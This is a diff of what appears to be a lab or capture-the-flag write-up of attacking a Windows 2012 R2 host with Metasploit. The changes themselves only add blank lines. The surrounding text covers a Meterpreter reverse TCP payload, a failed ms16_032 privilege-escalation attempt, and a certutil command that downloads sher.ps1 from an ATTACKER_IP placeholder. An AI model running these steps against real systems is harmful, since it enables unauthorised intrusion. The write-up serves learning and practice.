@@ -83,6 +83,7 @@ The available exploit targets were checked:
 show targets
 ```
 The module showed an automatic target option.
+
 ![](Attachments/Pasted%20image%2020260809193203.png)
 
 A Windows x64 Meterpreter reverse TCP payload was selected:
@@ -94,6 +95,7 @@ The required payload settings included the listener address and port.
 ![](Attachments/Pasted%20image%2020260809193345.png)
 
 the required information:
+
 ![](Attachments/Pasted%20image%2020260809193549.png)
 
 ---
@@ -137,12 +139,14 @@ set session 1
 ```
 
 `run`the exploit:
+
 ![](Attachments/Pasted%20image%2020260809220708.png)
 
 However, the exploit **failed to create a new session**.
 
 
 check the operating system details given by the meterpreter:
+
 ![](Attachments/Pasted%20image%2020260809223012.png)
 ```
 Windows 2012 R2 (Build 9600)
@@ -165,7 +169,9 @@ use exploit/window/local/ms16_032_secondary_logon_handler_privesc
 - set the other details too (lhost , lport.....etc)
 
 next, `run`:
+
 ![](Attachments/Pasted%20image%2020260809230507.png)
+
 didn't worked again.
 
 ---
@@ -184,6 +190,7 @@ Go back to the meterpreter and do `certutil`to download a file:
 certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/sher.ps1 sher.ps1
 ```
 ![](Attachments/Pasted%20image%2020260810000043.png)
+
 the file is uploaded into the window.
 
 Sherlock identified several potentially exploitable Windows vulnerabilities, including:
